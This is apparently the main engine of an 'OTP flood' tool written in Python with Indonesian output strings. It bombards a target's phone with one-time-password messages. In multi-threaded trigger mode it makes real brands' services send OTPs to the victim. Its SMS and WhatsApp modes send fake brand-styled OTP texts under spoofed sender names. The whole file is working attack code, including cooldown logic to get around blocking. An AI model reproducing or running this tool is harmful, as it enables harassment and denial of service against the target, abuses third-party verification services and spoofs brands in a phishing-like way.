"""
OTP Flood - Main Engine (Multi-Mode / Multi-Threaded)
Mode: WA (Baileys) | SMS (Alpha Sender) | TRIGGER (GRATIS - trigger OTP brand beneran)
"""

from datetime import datetime
import sys
import os
import time
import random
import concurrent.futures

sys.path.insert(0, os.path.dirname(os.path.dirname(__file__)))

from modules.otp_flood.profiles import PROFILES, get_generator
from modules.otp_flood.templates import CATEGORIES, get_brands_by_category, format_brand_message
from modules.otp_flood.sender_sms import _color
from modules.otp_flood.reporter import generate_report, save_report


def run_flood(config):
    target = config["target"]
    profile_key = config.get("profile", "linear")
    max_msgs = config.get("max_messages", 50)
    concurrency = config.get("threads", 10)  # Use threads parameter instead of interval for trigger
    mode = config.get("mode", "trigger")
    cats = config.get("categories")
    rotate = profile_key == "rotating"

    results = {
        "total_sent": 0,
        "total_blocked": 0,
        "total_errors": 0,
        "start_time": datetime.now().strftime("%H:%M:%S"),
        "end_time": "",
        "logs": [],
    }

    # Init sender based on mode
    sender = None
    if mode == "trigger":
        from modules.otp_flood.sender_trigger import OTPTrigger
        sender = OTPTrigger(target)
        yield f"\n  {_color.B}{_color.GRN}🔥 MODE TRIGGER (MULTI-THREADED){_color.RST}\n"
        yield f"  {_color.DIM}Attacking with {concurrency} concurrent threads...{_color.RST}\n\n"
    elif mode == "sms":
        from modules.otp_flood.sender_sms import SMSSender
        sender = SMSSender(target)
        yield f"\n  {_color.B}{_color.MAG}📡 MODE SMS — Alpha Sender ID{_color.RST}\n\n"
    else:
        from modules.otp_flood.sender import Sender as WASender
        sender = WASender(target)
        yield f"\n  {_color.B}{_color.CYN}💬 MODE WHATSAPP — QR scan{_color.RST}\n\n"

    # Multi-threaded Trigger Execution
    if mode == "trigger":
        brands = list(sender.BRANDS.keys())
        tasks = []
        # Prepare workload
        for i in range(max_msgs):
            b = brands[i % len(brands)] if rotate else random.choice(brands)
            tasks.append((i, b))

        def _worker(task_info):
            idx, b_key = task_info
            res = sender.trigger(b_key)
            return (idx, b_key, res)

        completed = 0
        with concurrent.futures.ThreadPoolExecutor(max_workers=concurrency) as executor:
            future_to_task = {executor.submit(_worker, t): t for t in tasks}
            for future in concurrent.futures.as_completed(future_to_task):
                idx, b_key, res = future.result()
                completed += 1
                b_name = sender.BRANDS[b_key]["name"]
                
                if res == "sent":
                    results["total_sent"] += 1
                    icon = "✅"
                    det = f"Hit {b_name}"
                elif res == "blocked":
                    results["total_blocked"] += 1
                    icon = "🔴"
                    det = f"Block {b_name}"
                else:
                    results["total_errors"] += 1
                    icon = "⚠️"
                    det = f"Err {b_name}"

                # Update UI
                fail_rate = (results["total_blocked"] + results["total_errors"]) / completed * 100
                progress = f"[{completed}/{max_msgs}]"
                bar_len = 25
                filled = int(completed / max_msgs * bar_len)
                bar = "█" * filled + "░" * (bar_len - filled)
                
                yield (
                    f"\033[2K{icon} {progress} {bar}\n"
                    f"\033[2K  ✅ {results['total_sent']} terkirim | "
                    f"⚠️ {results['total_errors']} error | "
                    f"🔴 {results['total_blocked']} block\n"
                    f"\033[2K  ⚡ {det}\n"
                    f"\033[2K  📈 Fail Rate: {fail_rate:.0f}%\n"
                    f"\033[4A" # Move cursor back up 4 lines
                )
        
        yield "\n\n\n\n" # Move past the progress bar lines

    # Sequential execution for SMS/WA
    else:
        brands = get_brands_by_category(cats)
        gen = get_generator(profile_key, {"interval": config.get("interval", 3)})
        block_cooldown = config.get("block_cooldown", 30)
        consecutive_blocks = 0
        
        for i in range(max_msgs):
            if rotate and brands:
                brand = brands[i % len(brands)]
            elif brands:
                brand = brands[0]
            else:
                brand = None

            if brand:
                msg_data = format_brand_message(brand)
            else:
                msg_data = {
                    "brand": "OTP", "category": "unknown",
                    "otp": str(abs(hash(str(i)) % 1000000)).zfill(6),
                    "message": f"Kode OTP Anda: {str(abs(hash(str(i)) % 1000000)).zfill(6)}",
                    "sender": "OTP",
                }

            result = sender.send(msg_data["message"], msg_data["sender"])
            timestamp = datetime.now().strftime("%H:%M:%S")
            detail = f"[{msg_data['brand']}] OTP: {msg_data['otp']}"
            results["logs"].append(f"{timestamp}  {detail}")

            if result["status"] == "sent":
                results["total_sent"] += 1
                consecutive_blocks = 0
                icon = "✅"
            elif result["status"] == "blocked":
                results["total_blocked"] += 1
                consecutive_blocks += 1
                icon = "🔴"
            else:
                results["total_errors"] += 1
                consecutive_blocks += 1
                icon = "⚠️"

            progress = f"[{i+1}/{max_msgs}]"
            bar_len = 25
            filled = int((i + 1) / max_msgs * bar_len)
            bar = "█" * filled + "░" * (bar_len - filled)
            total_so_far = i + 1
            fail_rate = (results["total_blocked"] + results["total_errors"]) / total_so_far * 100

            yield (
                f"\033[2K{icon} {progress} {bar}\n"
                f"\033[2K  ✅ {results['total_sent']} terkirim | "
                f"⚠️ {results['total_errors']} error | "
                f"🔴 {results['total_blocked']} block\n"
                f"\033[2K  📨 {detail}\n"
                f"\033[2K  ⏱  {timestamp} — Kegagalan: {fail_rate:.0f}%\n"
            )

            if consecutive_blocks >= 3:
                yield f"\n\033[2K  ⏸  Cooldown {block_cooldown}s...\n"
                for remaining in range(block_cooldown, -1, -1):
                    yield f"\033[2K  ⏳ {remaining}s   \r"
                    time.sleep(1)
                yield f"\033[2K  ✅ Lanjut\n"
                consecutive_blocks = 0

            try:
                wait = next(gen)
                if wait > 0:
                    for s in range(int(wait), 0, -1):
                        yield f"\033[2K  ⏱  {s}s...\r"
                        time.sleep(1)
            except StopIteration:
                break

    results["end_time"] = datetime.now().strftime("%H:%M:%S")
    report_text, grade, det_rate = generate_report(results, config)
    yield f"\n\n{report_text}\n"

    output_dir = os.path.join(os.path.dirname(os.path.dirname(__file__)), "reports")
    os.makedirs(output_dir, exist_ok=True)
    saved = save_report(report_text, output_dir)
    if saved:
        yield f"  📄 Report: {saved}\n"
